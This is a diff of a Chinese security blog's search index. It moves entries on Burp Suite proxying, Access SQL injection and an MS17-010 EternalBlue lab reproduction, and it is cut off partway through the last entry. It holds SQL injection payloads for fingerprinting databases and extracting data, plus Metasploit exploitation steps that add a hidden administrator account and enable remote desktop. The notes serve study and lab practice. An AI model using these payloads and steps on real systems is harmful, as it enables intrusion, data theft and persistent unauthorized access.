@@ -1,26 +1,68 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Burpsuite挂梯子抓包</title>
-    <url>/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/</url>
-    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>准备挂代理访问外网挖洞实战（另一点是准备挂代理挖国内src~）</p>
-<p>然而挂了代理之后，bp就无法使用了。</p>
-<h1 id="二、解决"><a href="#二、解决" class="headerlink" title="二、解决"></a>二、解决</h1><p><img src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165555796.png" alt="image-20210809165555796" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165555796.png" class="lozad post-image"></p>
-<p>1、Project options下，勾选Upstream Proxy Servers的override user option选项，出现3的输入框</p>
-<p>2、点击Add</p>
-<p> <img src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165603927.png" alt="image-20210809165603927" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165603927.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">1：*全部</span><br><span class="line">2：127.0.0.1</span><br><span class="line">3：梯子的端口</span><br><span class="line">4：None</span><br><span class="line">OK</span><br></pre>
-
-<p>3、配合bp原有的8080监听端口，打开梯子软件，可实现开启bp访问外网。</p>
-<p>注：梯子需要选择全局代理，否则国内网站依旧是真实ip。</p>
-<p>4、效果</p>
-<p> <img src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165614071.png" alt="image-20210809165614071" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165614071.png" class="lozad post-image"></p>
+    <title>Access注入</title>
+    <url>/article/Access%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p>端口：无</p>
+<p>没有数据库概念，一个文件就是一个库</p>
+<p>通常是asp+access搭配，只存在联合查询和bool盲注两种注入方式</p>
+<p><strong>Access数据库结构：</strong></p>
+<p>表名-&gt;列名-&gt;内容数据</p>
+<p>asp、aspx通常为mssql或access数据库</p>
+<table>
+<thead>
+<tr>
+<th align="left">判断</th>
+<th align="left">结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>and exists (select * from msysobjects)&gt;0</code></td>
+<td align="left">access</td>
+</tr>
+<tr>
+<td align="left"><code>?id=1&#39; and exists (select * from sysobjects)&gt;0 –</code></td>
+<td align="left">mssql</td>
+</tr>
+<tr>
+<td align="left">and sleep(3)</td>
+<td align="left">mysql</td>
+</tr>
+</tbody></table>
+<h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">判断数据库类型</td>
+<td align="left"><code>and exists (select * from msysobjects)&gt;0</code> <br>返回正为access数据库 <br><br><code>?id=1&#39; and exists (select * from sysobjects)&gt;0 –</code> <br>返回正常是mssql数据库</td>
+</tr>
+<tr>
+<td align="left">判断注入点</td>
+<td align="left">and 1=1 <br>and 1=0</td>
+</tr>
+<tr>
+<td align="left">判断列数</td>
+<td align="left">order by</td>
+</tr>
+<tr>
+<td align="left">猜解表名、列名</td>
+<td align="left">1、union猜解 <br>猜表名 <br><code>?id=1 union select 1,2,3,4 from 表名</code> <br>猜列名 <br><code>?id=1 union select 1,列名,3,4 from 表名</code> <br><br>2、exists猜解 <br>猜表名 <br><code>?id=1 and exists(select * from 表名)</code> <br>或 <br><code>?id=1 and 0 &lt; &gt; (select count(*) from 表名)</code> <br><br>猜列名 <br><code>?id=1 and exists(select 列名 from 表名)</code></td>
+</tr>
+<tr>
+<td align="left">暴数据</td>
+<td align="left">1、盲注 <br>猜长度： <br><code>?id=1 and (select top 1 len(列名) from 表名)=猜解的长度</code> <br>猜内容： <br><code>?id=1 and (select top 1 asc(mid(列名,1,1)) from 表名)&gt;猜解的ascii码值</code>  <br><br>2、移位溢出 <br><code>union select 1,2,3,4,5,6,7,table.* from 表名;</code> <br><code>union select 1,2,3,4,5,6,table.*,7 from 表名;</code> <br><code>union select 1,2,3,4,5,table.*,6,7 from 表名;</code></td>
+</tr>
+</tbody></table>
 ]]></content>
       <categories>
         <category>Web渗透</category>
       </categories>
       <tags>
-        <tag>BurpSuite代理</tag>
+        <tag>Access</tag>
       </tags>
   </entry>
   <entry>
@@ -82,6 +124,29 @@
       </categories>
       <tags>
         <tag>绕过Token爆破</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Burpsuite挂梯子抓包</title>
+    <url>/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/</url>
+    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>准备挂代理访问外网挖洞实战（另一点是准备挂代理挖国内src~）</p>
+<p>然而挂了代理之后，bp就无法使用了。</p>
+<h1 id="二、解决"><a href="#二、解决" class="headerlink" title="二、解决"></a>二、解决</h1><p><img src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165555796.png" alt="image-20210809165555796" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165555796.png" class="lozad post-image"></p>
+<p>1、Project options下，勾选Upstream Proxy Servers的override user option选项，出现3的输入框</p>
+<p>2、点击Add</p>
+<p> <img src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165603927.png" alt="image-20210809165603927" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165603927.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">1：*全部</span><br><span class="line">2：127.0.0.1</span><br><span class="line">3：梯子的端口</span><br><span class="line">4：None</span><br><span class="line">OK</span><br></pre>
+
+<p>3、配合bp原有的8080监听端口，打开梯子软件，可实现开启bp访问外网。</p>
+<p>注：梯子需要选择全局代理，否则国内网站依旧是真实ip。</p>
+<p>4、效果</p>
+<p> <img src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165614071.png" alt="image-20210809165614071" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210809165614071.png" class="lozad post-image"></p>
+]]></content>
+      <categories>
+        <category>Web渗透</category>
+      </categories>
+      <tags>
+        <tag>BurpSuite代理</tag>
       </tags>
   </entry>
   <entry>
@@ -1377,71 +1442,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Access注入</title>
-    <url>/article/Access%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<p>端口：无</p>
-<p>没有数据库概念，一个文件就是一个库</p>
-<p>通常是asp+access搭配，只存在联合查询和bool盲注两种注入方式</p>
-<p><strong>Access数据库结构：</strong></p>
-<p>表名-&gt;列名-&gt;内容数据</p>
-<p>asp、aspx通常为mssql或access数据库</p>
-<table>
-<thead>
-<tr>
-<th align="left">判断</th>
-<th align="left">结果</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left"><code>and exists (select * from msysobjects)&gt;0</code></td>
-<td align="left">access</td>
-</tr>
-<tr>
-<td align="left"><code>?id=1&#39; and exists (select * from sysobjects)&gt;0 –</code></td>
-<td align="left">mssql</td>
-</tr>
-<tr>
-<td align="left">and sleep(3)</td>
-<td align="left">mysql</td>
-</tr>
-</tbody></table>
-<h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><table>
-<thead>
-<tr>
-<th align="left">方法</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">判断数据库类型</td>
-<td align="left"><code>and exists (select * from msysobjects)&gt;0</code> <br>返回正为access数据库 <br><br><code>?id=1&#39; and exists (select * from sysobjects)&gt;0 –</code> <br>返回正常是mssql数据库</td>
-</tr>
-<tr>
-<td align="left">判断注入点</td>
-<td align="left">and 1=1 <br>and 1=0</td>
-</tr>
-<tr>
-<td align="left">判断列数</td>
-<td align="left">order by</td>
-</tr>
-<tr>
-<td align="left">猜解表名、列名</td>
-<td align="left">1、union猜解 <br>猜表名 <br><code>?id=1 union select 1,2,3,4 from 表名</code> <br>猜列名 <br><code>?id=1 union select 1,列名,3,4 from 表名</code> <br><br>2、exists猜解 <br>猜表名 <br><code>?id=1 and exists(select * from 表名)</code> <br>或 <br><code>?id=1 and 0 &lt; &gt; (select count(*) from 表名)</code> <br><br>猜列名 <br><code>?id=1 and exists(select 列名 from 表名)</code></td>
-</tr>
-<tr>
-<td align="left">暴数据</td>
-<td align="left">1、盲注 <br>猜长度： <br><code>?id=1 and (select top 1 len(列名) from 表名)=猜解的长度</code> <br>猜内容： <br><code>?id=1 and (select top 1 asc(mid(列名,1,1)) from 表名)&gt;猜解的ascii码值</code>  <br><br>2、移位溢出 <br><code>union select 1,2,3,4,5,6,7,table.* from 表名;</code> <br><code>union select 1,2,3,4,5,6,table.*,7 from 表名;</code> <br><code>union select 1,2,3,4,5,table.*,6,7 from 表名;</code></td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>Web渗透</category>
-      </categories>
-      <tags>
-        <tag>Access</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>JavaScript基础</title>
     <url>/article/JavaScript%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<h1 id="js调用方法（4种）"><a href="#js调用方法（4种）" class="headerlink" title="js调用方法（4种）"></a>js调用方法（4种）</h1><table>
@@ -1816,64 +1816,6 @@
       </tags>
   </entry>
   <entry>
-    <title>MS17-010漏洞复现</title>
-    <url>/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h1><p>MS17-010又称为永恒之蓝，通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞。目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
-<h1 id="二、探测"><a href="#二、探测" class="headerlink" title="二、探测"></a>二、探测</h1><p>靶机：win7 x64 sp1 IP：192.168.66.98<br>攻击机：kali 2020.4 IP：192.168.66.138</p>
-<h2 id="1、通过nmap扫描目标机器，发现139、445端口"><a href="#1、通过nmap扫描目标机器，发现139、445端口" class="headerlink" title="1、通过nmap扫描目标机器，发现139、445端口"></a>1、通过nmap扫描目标机器，发现139、445端口</h2><pre class="highlight"><span class="line">nmap -V -T4 192.168.66.98   </span><br><span class="line">#T4设置扫描速度，越高越快（1-5）</span><br><span class="line">#-V显示详情</span><br></pre>
-
-<p>结果：</p>
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161636575.png" alt="image-20210809161636575" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161636575.png" class="lozad post-image"></p>
-<h2 id="2、使用msf探测是否存在MS17-010漏洞"><a href="#2、使用msf探测是否存在MS17-010漏洞" class="headerlink" title="2、使用msf探测是否存在MS17-010漏洞"></a>2、使用msf探测是否存在MS17-010漏洞</h2><p>a、寻找MS17-010模块</p>
-<pre class="highlight"><span class="line">search MS17-010</span><br></pre>
-
-<p>发现2个探测模块和4个利用模块</p>
-<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161651064.png" alt="image-20210809161651064" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161651064.png" class="lozad post-image"></p>
-<h2 id="3、利用auxiliary-scanner-smb-smb-ms17-010探测模块进行漏洞探测"><a href="#3、利用auxiliary-scanner-smb-smb-ms17-010探测模块进行漏洞探测" class="headerlink" title="3、利用auxiliary/scanner/smb/smb_ms17_010探测模块进行漏洞探测"></a>3、利用auxiliary/scanner/smb/smb_ms17_010探测模块进行漏洞探测</h2><pre class="highlight"><span class="line">use auxiliary/scanner/smb/smb_ms17_010   	#调用探测模块</span><br><span class="line">show options                 				#显示配置参数</span><br><span class="line">set RHOSTS 192.168.66.98          			#设置目标IP</span><br><span class="line">run                     					#运行探测程序</span><br></pre>
-
-<p>探测出存在MS17-010漏洞</p>
-<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161701790.png" alt="image-20210809161701790" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161701790.png" class="lozad post-image"></p>
-<h1 id="三、利用"><a href="#三、利用" class="headerlink" title="三、利用"></a>三、利用</h1><h2 id="1、使用攻击模块对靶机发起攻击"><a href="#1、使用攻击模块对靶机发起攻击" class="headerlink" title="1、使用攻击模块对靶机发起攻击"></a>1、使用攻击模块对靶机发起攻击</h2><pre class="highlight"><span class="line">use exploit/windows/smb/ms17_010_eternalblue    #调用攻击模块</span><br><span class="line">show options                                    #显示配置参数</span><br><span class="line">set RHOSTS 192.168.66.98                        #设置目标IP</span><br><span class="line">run                                             #运行探测程序</span><br></pre>
-
-<p>攻击成功，进入后渗透攻击阶段</p>
-<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161712134.png" alt="image-20210809161712134" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161712134.png" class="lozad post-image"></p>
-<h2 id="2、靶机信息收集"><a href="#2、靶机信息收集" class="headerlink" title="2、靶机信息收集"></a>2、靶机信息收集</h2><p>a、查看目标主机详细信息</p>
-<pre class="highlight"><span class="line">sysinfo</span><br></pre>
-
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161720244.png" alt="image-20210809161720244" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161720244.png" class="lozad post-image"></p>
-<p>b、查看当前获取的权限</p>
-<pre class="highlight"><span class="line">getuid</span><br></pre>
-
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161730216.png" alt="image-20210809161730216" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161730216.png" class="lozad post-image"></p>
-<p>system权限，无需提权</p>
-<h2 id="3、开启远程桌面"><a href="#3、开启远程桌面" class="headerlink" title="3、开启远程桌面"></a>3、开启远程桌面</h2><pre class="highlight"><span class="line">run getgui -e</span><br></pre>
-
-<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161744651.png" alt="image-20210809161744651" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161744651.png" class="lozad post-image"></p>
-<p>成功开启远程桌面</p>
-<h2 id="4、切换到cmd命令行模式"><a href="#4、切换到cmd命令行模式" class="headerlink" title="4、切换到cmd命令行模式"></a>4、切换到cmd命令行模式</h2><pre class="highlight"><span class="line">shell</span><br></pre>
-
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161756295.png" alt="image-20210809161756295" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161756295.png" class="lozad post-image"></p>
-<h2 id="5、添加用户"><a href="#5、添加用户" class="headerlink" title="5、添加用户"></a>5、添加用户</h2><pre class="highlight"><span class="line">net user  </span><br></pre>
-
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161805432.png" alt="image-20210809161805432" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161805432.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">net user hacker hacker.123 /add        #添加用户、密码</span><br><span class="line"></span><br><span class="line">net localgroup administrators hacker /add  #提权至管理员组</span><br><span class="line"></span><br><span class="line">net localgroup administrators        #查看管理员组成员</span><br></pre>
-
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161814628.png" alt="image-20210809161814628" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161814628.png" class="lozad post-image"></p>
-<p>提权成功</p>
-<h2 id="6、开启远程桌面连接"><a href="#6、开启远程桌面连接" class="headerlink" title="6、开启远程桌面连接"></a>6、开启远程桌面连接</h2><p>a、win+r，输入mstsc调出远程桌面，输入账号密码进行远程桌面连接</p>
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161826717.png" alt="image-20210809161826717" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161826717.png" class="lozad post-image"></p>
-<p>b、成功连接至靶机</p>
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161839547.png" alt="image-20210809161839547" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161839547.png" class="lozad post-image"></p>
-<p>至此，本次利用结束。后文附上meterpreter的其他指令，不做演示。</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>MS17-010</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Linux随记</title>
     <url>/article/Linux%E9%9A%8F%E8%AE%B0/</url>
     <content><![CDATA[<h1 id="网卡配置"><a href="#网卡配置" class="headerlink" title="网卡配置"></a>网卡配置</h1><h2 id="配置静态IP："><a href="#配置静态IP：" class="headerlink" title="配置静态IP："></a>配置静态IP：</h2><pre class="highlight"><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-eth0 或ifcfg-ens33</span><br><span class="line"></span><br><span class="line">ONBOOT=yes</span><br><span class="line"></span><br><span class="line">BOOTPROTO=&quot;static&quot;</span><br><span class="line"></span><br><span class="line">IPADDR=&quot;192.168.x.x&quot;</span><br><span class="line"></span><br><span class="line">NETMASK=&quot;255.255.255.0&quot;</span><br><span class="line"></span><br><span class="line">GATEWAY=&quot;192.168.x.1&quot;</span><br><span class="line">ifdown eth0   禁用网卡</span><br><span class="line"></span><br><span class="line">ifup eth0      启用网卡</span><br></pre>
@@ -2180,6 +2122,64 @@
       </categories>
       <tags>
         <tag>随记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MS17-010漏洞复现</title>
+    <url>/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h1><p>MS17-010又称为永恒之蓝，通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞。目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
+<h1 id="二、探测"><a href="#二、探测" class="headerlink" title="二、探测"></a>二、探测</h1><p>靶机：win7 x64 sp1 IP：192.168.66.98<br>攻击机：kali 2020.4 IP：192.168.66.138</p>
+<h2 id="1、通过nmap扫描目标机器，发现139、445端口"><a href="#1、通过nmap扫描目标机器，发现139、445端口" class="headerlink" title="1、通过nmap扫描目标机器，发现139、445端口"></a>1、通过nmap扫描目标机器，发现139、445端口</h2><pre class="highlight"><span class="line">nmap -V -T4 192.168.66.98   </span><br><span class="line">#T4设置扫描速度，越高越快（1-5）</span><br><span class="line">#-V显示详情</span><br></pre>
+
+<p>结果：</p>
+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161636575.png" alt="image-20210809161636575" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161636575.png" class="lozad post-image"></p>
+<h2 id="2、使用msf探测是否存在MS17-010漏洞"><a href="#2、使用msf探测是否存在MS17-010漏洞" class="headerlink" title="2、使用msf探测是否存在MS17-010漏洞"></a>2、使用msf探测是否存在MS17-010漏洞</h2><p>a、寻找MS17-010模块</p>
+<pre class="highlight"><span class="line">search MS17-010</span><br></pre>
+
+<p>发现2个探测模块和4个利用模块</p>
+<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161651064.png" alt="image-20210809161651064" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161651064.png" class="lozad post-image"></p>
+<h2 id="3、利用auxiliary-scanner-smb-smb-ms17-010探测模块进行漏洞探测"><a href="#3、利用auxiliary-scanner-smb-smb-ms17-010探测模块进行漏洞探测" class="headerlink" title="3、利用auxiliary/scanner/smb/smb_ms17_010探测模块进行漏洞探测"></a>3、利用auxiliary/scanner/smb/smb_ms17_010探测模块进行漏洞探测</h2><pre class="highlight"><span class="line">use auxiliary/scanner/smb/smb_ms17_010   	#调用探测模块</span><br><span class="line">show options                 				#显示配置参数</span><br><span class="line">set RHOSTS 192.168.66.98          			#设置目标IP</span><br><span class="line">run                     					#运行探测程序</span><br></pre>
+
+<p>探测出存在MS17-010漏洞</p>
+<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161701790.png" alt="image-20210809161701790" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161701790.png" class="lozad post-image"></p>
+<h1 id="三、利用"><a href="#三、利用" class="headerlink" title="三、利用"></a>三、利用</h1><h2 id="1、使用攻击模块对靶机发起攻击"><a href="#1、使用攻击模块对靶机发起攻击" class="headerlink" title="1、使用攻击模块对靶机发起攻击"></a>1、使用攻击模块对靶机发起攻击</h2><pre class="highlight"><span class="line">use exploit/windows/smb/ms17_010_eternalblue    #调用攻击模块</span><br><span class="line">show options                                    #显示配置参数</span><br><span class="line">set RHOSTS 192.168.66.98                        #设置目标IP</span><br><span class="line">run                                             #运行探测程序</span><br></pre>
+
+<p>攻击成功，进入后渗透攻击阶段</p>
+<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161712134.png" alt="image-20210809161712134" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161712134.png" class="lozad post-image"></p>
+<h2 id="2、靶机信息收集"><a href="#2、靶机信息收集" class="headerlink" title="2、靶机信息收集"></a>2、靶机信息收集</h2><p>a、查看目标主机详细信息</p>
+<pre class="highlight"><span class="line">sysinfo</span><br></pre>
+
+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161720244.png" alt="image-20210809161720244" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161720244.png" class="lozad post-image"></p>
+<p>b、查看当前获取的权限</p>
+<pre class="highlight"><span class="line">getuid</span><br></pre>
+
+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161730216.png" alt="image-20210809161730216" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161730216.png" class="lozad post-image"></p>
+<p>system权限，无需提权</p>
+<h2 id="3、开启远程桌面"><a href="#3、开启远程桌面" class="headerlink" title="3、开启远程桌面"></a>3、开启远程桌面</h2><pre class="highlight"><span class="line">run getgui -e</span><br></pre>
+
+<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161744651.png" alt="image-20210809161744651" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161744651.png" class="lozad post-image"></p>
+<p>成功开启远程桌面</p>
+<h2 id="4、切换到cmd命令行模式"><a href="#4、切换到cmd命令行模式" class="headerlink" title="4、切换到cmd命令行模式"></a>4、切换到cmd命令行模式</h2><pre class="highlight"><span class="line">shell</span><br></pre>
+
+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161756295.png" alt="image-20210809161756295" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161756295.png" class="lozad post-image"></p>
+<h2 id="5、添加用户"><a href="#5、添加用户" class="headerlink" title="5、添加用户"></a>5、添加用户</h2><pre class="highlight"><span class="line">net user  </span><br></pre>
+
+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161805432.png" alt="image-20210809161805432" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161805432.png" class="lozad post-image"></p>
